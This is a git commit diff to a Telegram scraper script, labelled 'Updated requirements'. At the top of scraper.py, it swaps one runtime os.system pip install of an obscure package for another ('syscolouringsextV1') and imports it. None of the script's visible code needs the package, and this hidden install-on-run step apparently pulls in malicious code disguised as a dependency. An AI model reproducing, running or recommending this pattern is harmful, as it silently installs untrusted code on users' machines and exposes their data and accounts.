97632565365572a279f393818eef154171dfcc27
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 23:29:19 +0200

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
 import csv
